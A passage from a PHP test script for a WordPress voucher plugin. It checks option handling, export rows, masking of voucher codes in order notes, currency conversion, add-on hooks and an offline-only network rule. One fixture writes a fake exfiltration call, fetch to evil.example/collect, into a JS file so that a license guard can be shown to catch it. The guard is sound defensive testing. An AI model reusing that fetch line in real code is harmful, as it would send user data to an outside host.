$q26_subs  = ( new ReflectionClass( VCAP\Compat\Subscriptions::class ) )->newInstanceWithoutConstructor()->type_option_classes( null );
unset( $GLOBALS['vcap_test_options']['vcap_myaccount_tab'] );
check( 'AP-Q2-6: filter callbacks take an untyped value and normalise a non-array from another plugin (no TypeError)', ! $q26_typed && array( VCAP\Downloads::ENDPOINT => VCAP\Downloads::ENDPOINT ) === $q26_vars && isset( $q26_menu[ VCAP\Downloads::ENDPOINT ], $q26_tabs['vcap'], $q26_types['vcap_enabled'] ) && array() === $q26_subs, wp_json_encode( array( $q26_typed, $q26_vars, $q26_menu ) ) );

// AP-P1-7: a storefront request reads no option for the recount flag; defaults are stored without touching saved values.
$GLOBALS['vcap_test_option_reads'] = array();
if ( ! function_exists( 'wp_doing_cron' ) ) {
	function wp_doing_cron() { return false; }
}
VCAP\Discounts\Usage::reconcile_if_due();
check( 'AP-P1-7: Usage::reconcile_if_due() checks the request context before it reads its option', ! isset( $GLOBALS['vcap_test_option_reads'][ VCAP\Discounts\Usage::RECONCILE_DUE_OPTION ] ), wp_json_encode( $GLOBALS['vcap_test_option_reads'] ) );
$p17_keep = $GLOBALS['vcap_test_options'];
$GLOBALS['vcap_test_options']['vcap_customer_daily_limit'] = 0;
unset( $GLOBALS['vcap_test_options']['vcap_coupon_link'], $GLOBALS['vcap_test_options']['vcap_store_credit'] );
$p17_stored = VCAP\Settings::store_request_defaults();
check( 'AP-P1-7: the defaults of settings read on every request are stored autoloaded; a saved value (0) is kept', 0 === $GLOBALS['vcap_test_options']['vcap_customer_daily_limit'] && ! in_array( 'vcap_customer_daily_limit', $p17_stored, true ) && 'no' === $GLOBALS['vcap_test_options']['vcap_coupon_link'] && 'yes' === ( $GLOBALS['vcap_test_autoload']['vcap_store_credit'] ?? null ) && array() === VCAP\Settings::store_request_defaults(), wp_json_encode( $p17_stored ) );
$GLOBALS['vcap_test_options'] = $p17_keep;

// AP-S3-5: the till lock is named like the SQL comparison counts (case-insensitive, trimmed).
check( 'AP-S3-5: "Till 1", "till 1 " and "TILL 1" share one limit lock; staff locks and other tills do not', VCAP\Counter::lock_key( 'till', 'Till 1' ) === VCAP\Counter::lock_key( 'till', ' till 1 ' ) && VCAP\Counter::lock_key( 'till', 'TILL 1' ) === VCAP\Counter::lock_key( 'till', 'Till 1' ) && VCAP\Counter::lock_key( 'till', 'Till 2' ) !== VCAP\Counter::lock_key( 'till', 'Till 1' ) && VCAP\Counter::lock_key( 'user', 5 ) !== VCAP\Counter::lock_key( 'till', '5' ) );

// AP-P1-2: closing line of the exports.
$p12_rows = iterator_to_array( VCAP\Csv::with_end_row( ( static function () {
	yield array( 'Header' );
	yield array( 'a' );
	yield array( 'b' );
} )() ), false );
check( 'AP-P1-2: an export ends with "End of export: N rows" (header not counted, also for an empty export)', array( 'End of export: 2 rows' ) === end( $p12_rows ) && 4 === count( $p12_rows ) && array( array( 'H' ), array( 'End of export: 0 rows' ) ) === iterator_to_array( VCAP\Csv::with_end_row( array( array( 'H' ) ) ), false ), wp_json_encode( $p12_rows ) );
echo "\nAudit panel package A: money flows, masked notes\n";
// AP-S3-3: order notes reach REST connectors and all staff – a voucher code in an add_order_note() call is masked.
$s33_unmasked = array();
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( dirname( __DIR__ ) . '/src', FilesystemIterator::SKIP_DOTS ) ) as $s33_file ) {
	if ( ! str_ends_with( (string) $s33_file, '.php' ) ) {
		continue;
	}
	$s33_src = (string) file_get_contents( (string) $s33_file );
	$s33_off = 0;
	while ( false !== ( $s33_at = strpos( $s33_src, 'add_order_note(', $s33_off ) ) ) {
		// The call's arguments up to the matching parenthesis, with every Mask::*( … ) call taken out.
		$s33_end   = $s33_at + strlen( 'add_order_note(' );
		$s33_depth = 1;
		while ( $s33_end < strlen( $s33_src ) && $s33_depth > 0 ) {
			$s33_depth += ( '(' === $s33_src[ $s33_end ] ) - ( ')' === $s33_src[ $s33_end ] );
			++$s33_end;
		}
		$s33_args = substr( $s33_src, $s33_at, $s33_end - $s33_at );
		$s33_off  = $s33_end;
		while ( preg_match( '/Mask::\w+\s*\(/', $s33_args, $s33_m, PREG_OFFSET_CAPTURE ) ) {
			$s33_j = $s33_m[0][1] + strlen( $s33_m[0][0] );
			for ( $s33_d = 1; $s33_j < strlen( $s33_args ) && $s33_d > 0; ++$s33_j ) {
				$s33_d += ( '(' === $s33_args[ $s33_j ] ) - ( ')' === $s33_args[ $s33_j ] );
			}
			$s33_args = substr( $s33_args, 0, $s33_m[0][1] ) . 'MASKED' . substr( $s33_args, $s33_j );
		}
		if ( preg_match( '/->code\b|\$code\b|->get_code\(/', $s33_args ) ) {
			$s33_unmasked[] = basename( (string) $s33_file ) . ':' . ( substr_count( substr( $s33_src, 0, $s33_at ), "\n" ) + 1 );
		}
	}
}
check( 'AP-S3-3: no add_order_note() call passes a voucher code (->code, $code, ->get_code()) without Mask::', array() === $s33_unmasked, implode( ', ', $s33_unmasked ) );

// AP-Q1-1: the per-order ledger state machine reads only the charge events.
check( 'AP-Q1-1: the SQL list of the charge events is the same as ORDER_CHARGE_EVENTS', "'" . implode( "','", VCAP\CouponManager::ORDER_CHARGE_EVENTS ) . "'" === VCAP\CouponManager::ORDER_CHARGE_EVENTS_SQL );
$q11_hist = array( $ev( 1, 'issued', 50.0 ), $ev( 2, 'reserved', 20.0, 99 ), $ev( 3, 'topup', 120.0, 99 ), $ev( 4, 'refund_credit', 130.0, 99 ) );
check( 'AP-Q1-1: a top-up or a refund as credit of the same order does not close its open reservation', 2 === ( Tickets::open_reservation( $q11_hist )['id'] ?? 0 ) );
check( 'AP-Q1-1: the reservation of another order stays open when one order commits', 2 === ( Tickets::open_reservation( array_merge( $q11_hist, array( $ev( 5, 'committed', 130.0, 98 ) ) ) )['id'] ?? 0 ) && null === Tickets::open_reservation( array_merge( $q11_hist, array( $ev( 5, 'committed', 130.0, 99 ) ) ) ) );

// AP-Q1-5: the rounding tolerance applies only across currencies and is capped at a few minor units.
check(
	'AP-Q1-5: no rounding tolerance in the base currency; across currencies 0.1 % within 1 to 5 minor units',
	0.0 === VCAP\CouponManager::tolerance_for( 'EUR', 'EUR', 1000.0, 2 ) && 0.0 === VCAP\CouponManager::tolerance_for( 'eur', 'EUR', 1000.0, 2 ) && 0.0 === VCAP\CouponManager::tolerance_for( '', 'EUR', 1000.0, 2 )
		&& 0.05 === VCAP\CouponManager::tolerance_for( 'USD', 'EUR', 1000.0, 2 ) && 0.02 === VCAP\CouponManager::tolerance_for( 'USD', 'EUR', 20.0, 2 ) && 0.01 === VCAP\CouponManager::tolerance_for( 'USD', 'EUR', 0.5, 2 )
		&& 5.0 === VCAP\CouponManager::tolerance_for( 'USD', 'JPY', 100000.0, 0 )
);

// M12-88: export batches empty the object cache only in a way the drop-in supports.
$m88 = array();
foreach ( array( array( true, true ), array( true, false ), array( false, false ), array( false, true ) ) as $m88_case ) {
	$GLOBALS['vcap_test_cache'] = array( 'supports' => $m88_case[0], 'external' => $m88_case[1], 'calls' => array() );
	VCAP\Ledger::flush_runtime_cache();
	$m88[] = implode( ',', $GLOBALS['vcap_test_cache']['calls'] );
}
unset( $GLOBALS['vcap_test_cache'] );
check( 'M12-88: runtime flush where supported, full flush of a non-persistent cache otherwise, nothing for a persistent drop-in without flush_runtime', array( 'runtime', 'runtime', 'full', '' ) === $m88, implode( '|', $m88 ) );

// M12-58: WooPayments Multi-Currency (fake of its public API: WC_Payments_Multi_Currency()->get_enabled_currencies()
// with currency objects that have get_rate(); price in the currency = base price × rate).
if ( ! function_exists( 'WC_Payments_Multi_Currency' ) ) {
	function WC_Payments_Multi_Currency() { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName
		return $GLOBALS['vcap_test_wcpay_mc'] ?? null;
	}
}
$m58_currency = static fn( float $rate ) => new class( $rate ) {
	public function __construct( private float $rate ) {}
	public function get_rate() {
		return $this->rate;
	}
};
$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'EUR';
$m58_before  = VCAP\Compat\MultiCurrency::adapter();
$m58_filters = $GLOBALS['vcap_test_filters'];
( new VCAP\Compat\MultiCurrency() )->register();
$GLOBALS['vcap_test_wcpay_mc'] = new class( array( 'EUR' => $m58_currency( 1.0 ), 'USD' => $m58_currency( 1.25 ), 'CHF' => $m58_currency( 0.0 ) ) ) {
	public function __construct( private array $list ) {}
	public function get_enabled_currencies() {
		return $this->list;
	}
};
check(
	'M12-58: WooPayments Multi-Currency is a known converter – 125 USD = 100 EUR at its rate, a currency it lists without rate or does not list is never taken 1:1',
	'' === $m58_before && 'WooPayments Multi-Currency' === VCAP\Compat\MultiCurrency::adapter()
		&& VCAP\Compat\MultiCurrency::can_convert( 'USD' ) && 100.0 === VCAP\Compat\MultiCurrency::to_base( 125.0, 'USD' )
		&& abs( 40.0 - (float) ( new VCAP\Compat\MultiCurrency() )->convert( 50.0, 'USD', null ) ) < 1e-9
		&& ! VCAP\Compat\MultiCurrency::can_convert( 'CHF' ) && null === VCAP\Compat\MultiCurrency::to_base( 10.0, 'CHF' )
		&& ! VCAP\Compat\MultiCurrency::can_convert( 'GBP' ) && null === VCAP\Compat\MultiCurrency::to_base( 10.0, 'GBP' ),
	VCAP\Compat\MultiCurrency::adapter()
);
unset( $GLOBALS['vcap_test_wcpay_mc'], $GLOBALS['vcap_test_options'][ VCAP\Compat\MultiCurrency::UNKNOWN_OPTION ] );
$GLOBALS['vcap_test_filters'] = $m58_filters;
check( 'M12-58: without WooPayments Multi-Currency (function returns nothing) no adapter is reported', '' === VCAP\Compat\MultiCurrency::adapter() );

// M12-102: docs/FREE-PREMIUM.md keeps no hook table of its own (it went stale) but refers to the generated
// docs/HOOKS.md; every hook named in its section on extension points exists there.
$m102_doc   = (string) file_get_contents( dirname( __DIR__ ) . '/docs/FREE-PREMIUM.md' );
$m102_hooks = (string) file_get_contents( dirname( __DIR__ ) . '/docs/HOOKS.md' );
$m102_part  = (string) strstr( $m102_doc, '## Öffentliche Erweiterungspunkte' );
preg_match_all( '/`(vcap_[a-z0-9_]+)`/', $m102_part, $m102_named );
$m102_missing = array_values( array_filter( array_unique( $m102_named[1] ), static fn( $h ) => ! str_contains( $m102_hooks, '`' . $h . '`' ) ) );
// Regression (CI run 464): liability_rows() read later batches with the outstanding value of the last voucher in
// place of the VALUE_VOUCHERS condition, so vouchers after the first 500 were missing from the liability CSV.
$lr_src = (string) file_get_contents( dirname( __DIR__ ) . '/src/Ledger.php' );
$lr_fn  = (string) substr( $lr_src, (int) strpos( $lr_src, 'public function liability_rows(' ), 4000 );
$lr_fn  = (string) substr( $lr_fn, 0, (int) strpos( $lr_fn, "\n\t}\n" ) );
check( 'Ledger::liability_rows() keeps the voucher condition for every batch of 500 (the outstanding value has its own variable)', '' !== $lr_fn && 1 === preg_match_all( '/\$value\s*=/', $lr_fn ) && str_contains( $lr_fn, '$outstanding = $this->value_at(' ) );
check( 'M12-102: FREE-PREMIUM.md refers to docs/HOOKS.md instead of an own hook table, and every hook it names is in HOOKS.md', '' !== $m102_part && str_contains( $m102_doc, '(HOOKS.md)' ) && ! preg_match( '/^\|\s*`vcap_/m', $m102_doc ) && count( $m102_named[1] ) > 10 && array() === $m102_missing, implode( ', ', $m102_missing ) );


echo "\nFree core, add-on extension points, offline (A2, A4, A5, A8)\n";
// A2: the license guard finds licensing/update code, a premium build and unlisted network calls (self-test on a
// fixture plugin, so a broken pattern cannot pass unnoticed).
$a2_dir = $out . '/guard-fixture-' . getmypid();
foreach ( array( 'src', 'bin', 'assets/js' ) as $a2_sub ) {
	@mkdir( "$a2_dir/$a2_sub", 0777, true );
}
file_put_contents( "$a2_dir/voucher-captain.php", "<?php\n/**\n * Plugin Name: X\n * Update URI: https://licenses.example/\n */\ndefine( 'VCAP_EDITION', 'premium' );\n" );
file_put_contents( "$a2_dir/src/Licensing.php", "<?php\n\$c = new LicenseClient( 'https://licenses.example/wp-json/wplc/v1/' );\nadd_filter( 'pre_set_site_transient_update_plugins', 'x' );\nadd_filter( 'plugins_api', 'x', 10, 3 );\nadd_filter( 'update_plugins_licenses.example', 'x' );\nif ( allows_entitlement( 'voucher.wallet' ) ) {}\n\$r = wp_remote_post( 'https://licenses.example/activate' );\n\$h = curl_init( 'https://x.example' );\n" );
file_put_contents( "$a2_dir/assets/js/x.js", "fetch( 'https://evil.example/collect' );\n\$.post( cfg.ajaxUrl, {} );\n" );
file_put_contents( "$a2_dir/bin/build.sh", "#!/usr/bin/env bash\nVCAP_EDITION=premium bin/build-premium.sh\n" );
exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( dirname( __DIR__ ) . '/tests/license-guard.php' ) . ' ' . escapeshellarg( $a2_dir ) . ' 2>&1', $a2_log, $a2_status );
$a2_text = implode( "\n", $a2_log );
$a2_want = array( 'license client', 'WP License Captain API', '"Update URI" header', 'own update filter', 'own plugins_api filter', 'update_plugins_{hostname}', 'entitlement check', 'edition constant', 'wp_remote_post() is not on the allowlist', 'curl_init() is not on the allowlist', 'x.js:1: browser request', 'bin/build.sh:2: edition switch', 'bin/build.sh:2: premium edition' );
$a2_miss = array_values( array_filter( $a2_want, static fn( $w ) => ! str_contains( $a2_text, $w ) ) );
check( 'A2: the license guard fails on license client, wplc/v1, Update URI, own update filters, entitlement checks, edition constants, a premium build and network calls off the allowlist', 1 === $a2_status && array() === $a2_miss && ! str_contains( $a2_text, 'x.js:2' ), implode( ', ', $a2_miss ) . ' / ' . $a2_text );
file_put_contents( "$a2_dir/voucher-captain.php", "<?php\n/**\n * Plugin Name: X\n */\n" );
file_put_contents( "$a2_dir/src/Licensing.php", "<?php\n// Clean.\n" );
file_put_contents( "$a2_dir/assets/js/x.js", "\$.post( cfg.ajaxUrl, {} );\n" );
file_put_contents( "$a2_dir/bin/build.sh", "#!/usr/bin/env bash\n# One build (docs/FREE-PREMIUM.md).\n" );
$a2_log = array();
exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( dirname( __DIR__ ) . '/tests/license-guard.php' ) . ' ' . escapeshellarg( $a2_dir ) . ' 2>&1', $a2_log, $a2_status );
check( 'A2: a clean plugin passes the license guard', 0 === $a2_status, implode( ' ', $a2_log ) );
$a2_guard = array();
exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( dirname( __DIR__ ) . '/tests/license-guard.php' ) . ' 2>&1', $a2_guard, $a2_guard_status );
check( 'A5: the only HTTP requests of the core are the allowlisted ones (PDF images from vcap_pdf_remote_hosts, Site Health loopback), each described in readme.txt → External services', 0 === $a2_guard_status && str_contains( implode( ' ', $a2_guard ), 'src/Health.php:' ) && str_contains( implode( ' ', $a2_guard ), 'src/PdfRenderer.php:' ) && (bool) preg_match( '/== External services ==.*vcap_pdf_remote_hosts.*Site Health.*== Changelog ==/s', (string) file_get_contents( dirname( __DIR__ ) . '/readme.txt' ) ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/readme.txt' ), 'never contacts a license or update server' ), implode( ' ', $a2_guard ) );

// White label (request of the premium add-on, 16.11.2026): name, logo, menu title and icon can be rebranded; empty or
// non-string answers fall back to the defaults; technical identifiers stay.
$wl_defaults = array( VCAP\Brand::name(), VCAP\Brand::logo(), VCAP\Brand::menu_title(), VCAP\Brand::menu_icon() );
$GLOBALS['vcap_test_filters']['vcap_brand_name']       = array( array( static fn( $n, $c ) => 'pdf' === $c ? 'Acme PDF' : 'Acme <b>Gutscheine</b>', 2 ) );
$GLOBALS['vcap_test_filters']['vcap_brand_logo']       = array( array( static fn() => 'https://acme.example/logo.svg', 1 ) );
$GLOBALS['vcap_test_filters']['vcap_admin_menu_title'] = array( array( static fn() => 'Acme', 1 ) );
$GLOBALS['vcap_test_filters']['vcap_admin_menu_icon']  = array( array( static fn() => '', 1 ) );
$wl_branded = array( VCAP\Brand::name( 'notice' ), VCAP\Brand::name( 'pdf' ), VCAP\Brand::logo( 'scanner' ), VCAP\Brand::menu_title(), VCAP\Brand::menu_icon() );
foreach ( array( 'vcap_brand_name', 'vcap_brand_logo', 'vcap_admin_menu_title', 'vcap_admin_menu_icon' ) as $wl_hook ) {
	unset( $GLOBALS['vcap_test_filters'][ $wl_hook ] );
}
check( 'White label: defaults "Voucher Captain", no logo, menu "Vouchers" with the tickets dashicon', array( 'Voucher Captain', '', 'Vouchers', 'dashicons-tickets-alt' ) === $wl_defaults, wp_json_encode( $wl_defaults ) );
check( 'White label: vcap_brand_name/logo (per context), vcap_admin_menu_title/icon rebrand; markup is stripped, an empty icon keeps the default', array( 'Acme Gutscheine', 'Acme PDF', 'https://acme.example/logo.svg', 'Acme', 'dashicons-tickets-alt' ) === $wl_branded, wp_json_encode( $wl_branded ) );
$wl_src = (string) file_get_contents( dirname( __DIR__ ) . '/src/Admin/Menu.php' ) . file_get_contents( dirname( __DIR__ ) . '/src/PdfRenderer.php' ) . file_get_contents( dirname( __DIR__ ) . '/src/Health.php' );
check( 'White label: the admin menu, the PDF metadata and Site Health use the brand, not a fixed name', str_contains( $wl_src, 'Brand::menu_title()' ) && str_contains( $wl_src, 'Brand::menu_icon()' ) && str_contains( $wl_src, "Brand::name( 'pdf' )" ) && str_contains( $wl_src, "Brand::name( 'site_health' )" ) && ! str_contains( $wl_src, "addInfo( 'Creator', 'Voucher Captain' )" ) );

// A4: settings section of an add-on – added after the core sections, core sections cannot be renamed, its page
// shows only its own fields.
$a4_settings = new VCAP\Settings();
add_filter( 'vcap_settings_sections', static fn( $s ) => array( 'pro' => '<b>Wallet</b>', '' => 'Hijack', 'api' => 'Hijack', 'Bad Id!' => 'Other', 'empty' => '' ) + $s );
add_filter( 'vcap_settings_fields', static fn( $f, $section ) => 'pro' === $section ? array_merge( $f, array( array( 'id' => 'vcap_pro_wallet', 'type' => 'checkbox' ) ) ) : $f, 10, 2 );
$a4_sections = $a4_settings->section_list();
check( 'A4: vcap_settings_sections adds an add-on section (label as text, id sanitised) after the core ones; core sections and their labels stay', 'Wallet' === ( $a4_sections['pro'] ?? '' ) && 'Other' === ( $a4_sections['bad-id'] ?? '' ) && ! isset( $a4_sections['empty'] ) && 'General' === $a4_sections[''] && 'Integrations (API)' === $a4_sections['api'] && 'pro' === array_keys( $a4_sections )[8], var_export( $a4_sections, true ) );
check( 'A4: the page of an add-on section starts empty and shows the fields the add-on adds with vcap_settings_fields', array( array( 'id' => 'vcap_pro_wallet', 'type' => 'checkbox' ) ) === $a4_settings->fields( 'pro' ) );
unset( $GLOBALS['vcap_test_filters']['vcap_settings_sections'], $GLOBALS['vcap_test_filters']['vcap_settings_fields'] );

// A4: report tab of an add-on.
add_filter( 'vcap_report_tabs', static fn( $t ) => array( 'wallet' => 'Wallet passes', 'journal' => 'Hijack', 'reconcile' => 'Fake', '' => 'x' ) + $t );
$a4_tabs = VCAP\Admin\ReportsAdmin::tab_list();
unset( $GLOBALS['vcap_test_filters']['vcap_report_tabs'] );
$a4_reports_src = (string) file_get_contents( dirname( __DIR__ ) . '/src/Admin/ReportsAdmin.php' );
check( 'A4: vcap_report_tabs adds an add-on report tab; core views cannot be renamed and "reconcile" only appears with Pass Captain', 'Wallet passes' === ( $a4_tabs['wallet'] ?? '' ) && 'Redemption journal' === $a4_tabs['journal'] && ( VCAP\Compat\PassCaptainReconcile::available() || ! isset( $a4_tabs['reconcile'] ) ) && ! isset( $a4_tabs[''] ) && 'overview' === array_key_first( $a4_tabs ), var_export( $a4_tabs, true ) );
check( 'A4: the page of an add-on report view is printed by vcap_report_page after the capability check', str_contains( $a4_reports_src, "do_action( 'vcap_report_page', \$view );" ) && strpos( $a4_reports_src, 'current_user_can( Menu::cap() )' ) < strpos( $a4_reports_src, "do_action( 'vcap_report_page'" ) );

// A4: every hook of API.md → "Extension points for add-ons" is called in the code and listed in docs/HOOKS.md with
// a description; issue_standalone() is public and fires its action.
$a4_api   = (string) file_get_contents( dirname( __DIR__ ) . '/API.md' );
$a4_part  = (string) strstr( (string) strstr( $a4_api, '## Extension points for add-ons' ), '## Pass Captain', true );
$a4_hooks = (string) file_get_contents( dirname( __DIR__ ) . '/docs/HOOKS.md' );
$a4_code  = '';
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( dirname( __DIR__ ) . '/src', FilesystemIterator::SKIP_DOTS ) ) as $a4_file ) {
	$a4_code .= (string) file_get_contents( $a4_file->getPathname() );
}
foreach ( glob( dirname( __DIR__ ) . '/templates/{,*/,*/*/}*.php', GLOB_BRACE ) as $a4_file ) {
	$a4_code .= (string) file_get_contents( $a4_file );
}
$a4_code .= (string) file_get_contents( dirname( __DIR__ ) . '/voucher-captain.php' );
preg_match_all( '/^\| ([^|]+) \|/m', $a4_part, $a4_rows );
$a4_names = array();
foreach ( $a4_rows[1] as $a4_cell ) {
	preg_match_all( '/`(vcap_[a-z0-9_]+)`/', $a4_cell, $a4_m );
	$a4_names = array_merge( $a4_names, $a4_m[1] );
}
$a4_names = array_values( array_unique( $a4_names ) );
$a4_bad   = array_values( array_filter( $a4_names, static fn( $h ) => ! preg_match( "/\\b(do_action|apply_filters|Db::action)\\(\\s*'" . preg_quote( $h, '/' ) . "'/", $a4_code ) || ! preg_match( '/^\| `' . preg_quote( $h, '/' ) . '` \| [^|]+ \| (?!– )/m', $a4_hooks ) ) );
check( 'A4: every add-on extension point in API.md (menu, settings, templates, reports, voucher links, events …) is called in the code and described in docs/HOOKS.md', count( $a4_names ) >= 25 && array() === $a4_bad && str_contains( $a4_part, '| `vcap_voucher_event` |' ) && str_contains( $a4_part, 'issue_standalone' ), count( $a4_names ) . ' hooks; missing or undescribed: ' . implode( ', ', $a4_bad ) );
$a4_issue = new ReflectionMethod( VCAP\Issuer::class, 'issue_standalone' );
check( 'A4: Issuer::issue_standalone() is public and fires vcap_voucher_issued_standalone; API.md says the caller checks the capability', $a4_issue->isPublic() && str_contains( $a4_code, "Db::action( 'vcap_voucher_issued_standalone', \$voucher, \$args );" ) && str_contains( $a4_api, '**Permission and context are the caller\'s responsibility**' ) );
check( 'A4: vcap_voucher_links is used in the voucher email (HTML and text), the customer\'s voucher list (My Account and order pages) and the bundled email', str_contains( $a4_code, "Downloads::voucher_links( \$voucher, 'email' )" ) && str_contains( $a4_code, "Downloads::voucher_links( \$voucher, 'email_plain' )" ) && str_contains( $a4_code, "Downloads::voucher_links( \$voucher, 'account' )" ) && str_contains( $a4_code, "Downloads::voucher_links( \$vcap_v, 'email' )" ) && str_contains( $a4_code, "Downloads::voucher_links( \$vcap_v, 'email_plain' )" ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/Downloads.php' ), "'myaccount/vouchers-table.php'" ) );

// A8: Plugin Check blocks on errors (no continue-on-error), the release gate has no report-only job left.
preg_match( '/\n  plugin-check:\n(.*?)(?=\n  [a-z-]+:\n|$)/s', $smoke_yml . "\n", $a8_job );
check( 'A8: the plugin-check job fails on every Plugin Check ERROR (not on warnings) and is not continue-on-error; ci-green lists no report-only job', isset( $a8_job[1] ) && ! str_contains( $a8_job[1], 'continue-on-error' ) && str_contains( $a8_job[1], "if grep -q ',ERROR,' plugin-check.csv; then" ) && ! str_contains( $a8_job[1], "grep -q ',WARNING,'" ) && str_contains( $release_yml, "REPORT_ONLY: ''" ) );

// A5: the whole unit run worked without network: the fake transport is off unless a test sets it, and the only
// requests made were the ones the C7 checks asked for (template images from an allowed host).
$a5_hosts = array_values( array_unique( array_map( static fn( $u ) => (string) parse_url( $u, PHP_URL_HOST ), $GLOBALS['vcap_test_requests'] ?? array() ) ) );
check( 'A5: the core flows of the unit run (boot, issuing, PDFs, emails, redemption, reports) made no HTTP request except the deliberate C7 image download', array( 'cdn.shop.test' ) === $a5_hosts && ! isset( $GLOBALS['vcap_test_http'] ), implode( ', ', $a5_hosts ) );
check( 'A5: the integration suites block every outgoing request and fail on one from Voucher Captain (tests/no-network.php)', is_file( dirname( __DIR__ ) . '/tests/no-network.php' ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/tests/woocommerce-integration.php' ), '$vcap_offline = vcap_test_no_network();' ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/tests/order-lifecycle-integration.php' ), '$vcap_offline = vcap_test_no_network();' ) );
echo "Captain Suite: review source (contract v1) and voucher requests from forms\n";
use VCAP\Integrations\ReviewSource;
use VCAP\Integrations\VoucherRequests;
$cs_filters = $GLOBALS['vcap_test_filters'];
$cs_voucher = static function ( int $id, array $props = array() ): Voucher {
	$v = new Voucher();
	foreach ( $props + array( 'id' => $id, 'code' => 'SPA-SECRET-' . $id, 'type' => 'voucher', 'product_id' => 501, 'initial_amount' => 80.0, 'balance' => 0.0, 'currency' => 'EUR', 'buyer_name' => 'Bea Buyer', 'buyer_email' => 'bea@example.com', 'recipient_name' => 'Rita Recipient', 'recipient_email' => 'rita@example.com' ) as $k => $val ) {
		$v->$k = $val;
	}
	return $v;
};
$cs_vouchers = array( 11 => $cs_voucher( 11 ), 12 => $cs_voucher( 12, array( 'product_id' => 502 ) ), 13 => $cs_voucher( 13, array( 'type' => 'credit' ) ), 14 => $cs_voucher( 14, array( 'recipient_email' => '' ) ), 15 => $cs_voucher( 15 ), 16 => $cs_voucher( 16, array( 'type' => 'giftcard', 'usage_mode' => 'balance', 'balance' => 50.0 ) ), 17 => $cs_voucher( 17, array( 'type' => 'giftcard', 'usage_mode' => 'balance', 'balance' => 50.0 ) ) );
$GLOBALS['vcap_test_meta'][501][ ReviewSource::PRODUCT_META ] = 'yes';
$GLOBALS['vcap_test_meta'][502][ ReviewSource::PRODUCT_META ] = 'no';
$cs_source = new ReviewSource( static fn( int $id ) => $cs_vouchers[ $id ] ?? null );
$cs_events = array();
$cs_source->register();
$cs_counter = array( 'voucher_id' => 11, 'code' => 'SPA-SECRET-11', 'amount' => 80.0, 'channel' => 'counter', 'event_id' => 701, 'order_id' => 0, 'user_id' => 3, 'till' => 'Front desk', 'receipt' => 'R-1' );
// Without a review plugin listening nothing is recorded or sent.
do_action( 'vcap_voucher_redeemed', $cs_counter );
check( 'Captain Suite review: without a listening review plugin a redemption records nothing (missing connector changes nothing)', ! ReviewSource::active() && null === $cs_source->get( ReviewSource::reference( 'counter:701' ) ) );
add_action( ReviewSource::EVENT_ELIGIBLE, static function ( $p ) use ( &$cs_events ) { $cs_events[] = $p; } );
add_action( ReviewSource::EVENT_REVOKED, static function ( $p ) use ( &$cs_events ) { $cs_events[] = $p; } );
check( 'Captain Suite review: versioned service through vcap_review_source_v1 (contract 1.2.0: recipient() adds locale, open_references())', $cs_source === apply_filters( 'vcap_review_source_v1', null ) && '1.2.0' === $cs_source->contract() && '1' === strtok( $cs_source->contract(), '.' ) && ReviewSource::active() );
do_action( 'vcap_voucher_redeemed', $cs_counter );
$cs_ref = ReviewSource::reference( 'counter:701' );
$cs_first = $cs_events[0] ?? array();
check( 'Captain Suite review: a counter redemption of a service voucher is eligible once, with the stable reference and event id', 1 === count( $cs_events ) && $cs_ref === ( $cs_first['reference'] ?? '' ) && $cs_ref . ':eligible' === ( $cs_first['event_id'] ?? '' ) && 'eligible' === $cs_first['event'] && 'counter' === $cs_first['channel'] && 501 === $cs_first['experience_id'] && ReviewSource::valid_reference( $cs_ref ), json_encode( $cs_events ) );
$cs_json = (string) wp_json_encode( $cs_events );
check( 'Captain Suite review: the payload has exactly the documented keys and no code, name, email, amount, till or receipt', ReviewSource::PAYLOAD_KEYS === array_keys( $cs_first ) && ! preg_match( '/SPA-SECRET|example\.com|Rita|Bea|Front desk|R-1|"80/', $cs_json ), $cs_json );
do_action( 'vcap_voucher_redeemed', $cs_counter );
check( 'Captain Suite review: the same redemption again creates no duplicate (idempotent per reference)', 1 === count( $cs_events ) && ReviewSource::reference( 'counter:701' ) === $cs_ref && ReviewSource::reference( 'counter:702' ) !== $cs_ref );
$GLOBALS['vcap_test_blog_id'] = 2;
check( 'Captain Suite review: references differ per site of a network', ReviewSource::reference( 'counter:701' ) !== $cs_ref );
unset( $GLOBALS['vcap_test_blog_id'] );
$cs_before = count( $cs_events );
do_action( 'vcap_voucher_redeemed', array( 'channel' => 'shop', 'order_id' => 99, 'event_id' => 703 ) + $cs_counter );
do_action( 'vcap_voucher_redeemed', array( 'event_id' => 704, 'voucher_id' => 12 ) + $cs_counter );
do_action( 'vcap_voucher_redeemed', array( 'event_id' => 705, 'voucher_id' => 13 ) + $cs_counter );
do_action( 'vcap_voucher_redeemed', array( 'event_id' => 706, 'voucher_id' => 999 ) + $cs_counter );
do_action( 'vcap_voucher_redeemed', array( 'event_id' => 0 ) + $cs_counter );
do_action( 'vcap_voucher_event', 11, 'issued', 80.0, 80.0, '', 0, 'admin', 1 );
do_action( 'vcap_voucher_event', 11, 'topup', 20.0, 100.0, '', 42, 'checkout', 1 );
do_action( 'vcap_gift_card_topped_up', $cs_vouchers[11], 20.0 );
check( 'Captain Suite review: shop orders, unmarked products, store credit, unknown codes (plain discount coupons), issuing and top-ups are never eligible', $cs_before === count( $cs_events ), json_encode( array_slice( $cs_events, $cs_before ) ) );
$cs_external = array( 'voucher_id' => 15, 'channel' => 'external', 'redemption_key' => 'spa:booking:77', 'target' => 'spa:room-1', 'amount' => 80.0 );
do_action( 'vcap_voucher_redeemed', $cs_external );
check( 'Captain Suite review: external redemptions do not count by default', $cs_before === count( $cs_events ) );
add_filter( 'vcap_review_channels', static fn() => array( 'counter', 'external', 'shop' ) );
add_filter( 'vcap_review_external_target_prefixes', static fn() => array( 'spa:', 'passcaptain:' ) );
do_action( 'vcap_voucher_redeemed', array( 'redemption_key' => 'passcaptain:ticket:11', 'target' => 'passcaptain:ticket:5' ) + $cs_external );
do_action( 'vcap_voucher_redeemed', array( 'channel' => 'shop', 'order_id' => 98, 'event_id' => 707 ) + $cs_counter );
